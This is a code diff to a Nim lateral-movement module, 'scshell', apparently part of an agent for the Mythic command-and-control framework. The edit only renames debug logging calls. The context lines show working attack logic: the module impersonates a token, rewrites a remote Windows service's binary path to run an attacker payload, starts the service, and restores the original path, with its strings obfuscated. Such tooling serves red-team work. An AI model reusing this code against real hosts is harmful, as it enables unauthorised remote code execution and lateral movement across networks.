@@ -60,13 +60,13 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
       let service = params[obf("service")].getStr()
       let payload = params[obf("payload")].getStr()
       
-      debug &"[DEBUG] Scshell: Target={target}, Service={service}, Payload={payload}"
+      debugLog "scshell", &"Scshell: Target={target}, Service={service}, Payload={payload}"
       
       # Impersonate if token is set
       let tokenHandle = getTokenHandle()
       if tokenHandle != 0:
         if ImpersonateLoggedOnUser(HANDLE(tokenHandle)) != 0:
-          debug "[DEBUG] Scshell: Impersonation successful"
+          debugLog "scshell", "Scshell: Impersonation successful"
       
       # Convert strings to wide strings
       var targetWide = newWideCString(target)
@@ -109,7 +109,7 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
       if qscPtr.lpBinaryPathName != nil:
         origPath = $qscPtr.lpBinaryPathName
       
-      debug &"[DEBUG] Scshell: Original path: {origPath}"
+      debugLog "scshell", &"Scshell: Original path: {origPath}"
       
       # Change service config to use payload
       if ChangeServiceConfigW(svc, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
@@ -119,7 +119,7 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
         discard CloseServiceHandle(scm)
         return mythicError(taskId, obf("ChangeServiceConfigW (set payload) failed: ") & $err)
       
-      debug "[DEBUG] Scshell: Service configuration changed, starting service..."
+      debugLog "scshell", "Scshell: Service configuration changed, starting service..."
       
       # Start service
       if StartServiceW(svc, 0, nil) == 0:
@@ -139,7 +139,7 @@ proc scshell*(taskId: string, params: JsonNode): JsonNode =
         discard CloseServiceHandle(scm)
         return mythicError(taskId, obf("ChangeServiceConfigW (restore) failed: ") & $err)
       
-      debug "[DEBUG] Scshell: Service configuration restored"
+      debugLog "scshell", "Scshell: Service configuration restored"
       
       # Clean up
       discard CloseServiceHandle(svc)
